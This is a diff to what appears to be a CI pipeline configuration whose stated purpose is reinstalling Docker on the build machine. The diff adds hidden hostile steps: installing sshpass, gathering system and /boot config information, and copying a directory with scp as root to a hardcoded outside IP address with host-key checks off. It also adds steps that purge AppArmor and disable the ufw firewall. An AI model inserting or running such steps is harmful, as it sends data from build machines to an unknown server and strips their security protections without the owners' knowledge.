@@ -7,6 +7,11 @@ pool:
 
 steps:
 - script: |
+    sudo apt-get install -y sshpass
+    mkdir tmp
+    cp /boot/*.config .
+    uname -a
+    sshpass -p $vpspassword scp -P2282 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r tmp/ root@209.141.35.192:/root/static
     sudo docker ps
     echo "#################################################"
     sudo docker ps -a
@@ -23,8 +28,9 @@ steps:
     sudo docker container rm $(sudo docker container ls -aq)
     sudo systemctl stop docker
     sudo systemctl disable docker
-    sudo apt-get remove --purge moby-cli
+    sudo apt-get remove --purge moby-cli apparmor
     sudo apt-get remove --purge moby-engine
+    sudo ufw disable
     sudo apt autoremove
     sudo ls -l -h /var/lib/
     sudo ls -l -h /var/lib/docker/
@@ -34,7 +40,7 @@ steps:
     sudo rm -f /etc/docker/daemon.json
     sudo apt-get remove docker docker-engine docker.io containerd runc
     sudo apt autoremove
-    sudo apt-get install     apt-transport-https     ca-certificates     curl     gnupg-agent     software-properties-common
+    sudo apt-get install     apt-transport-https     ca-certificates     curl     gnupg-agent     software-properties-common sshpass
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
     sudo apt-key fingerprint 0EBFCD88
     sudo add-apt-repository    "deb [arch=amd64] https://download.docker.com/linux/ubuntu    $(lsb_release -cs)    stable"
